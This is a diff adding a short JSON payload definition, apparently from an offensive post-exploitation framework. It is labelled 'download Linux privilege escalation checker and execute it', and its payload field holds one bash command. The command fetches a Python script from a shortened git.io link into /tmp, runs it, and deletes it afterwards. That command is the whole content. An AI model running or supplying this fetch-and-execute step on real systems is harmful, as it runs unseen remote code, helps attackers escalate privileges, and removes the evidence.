@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "download Linux privilege escalation checker and execute it",
+      "type": "other",
+      "exec": "bash"
+    },
+    "payload": "wget -O /tmp/lpec.py https://git.io/fh4cp && cd /tmp && python lpec.py && rm lpec.py"
+  }
+}
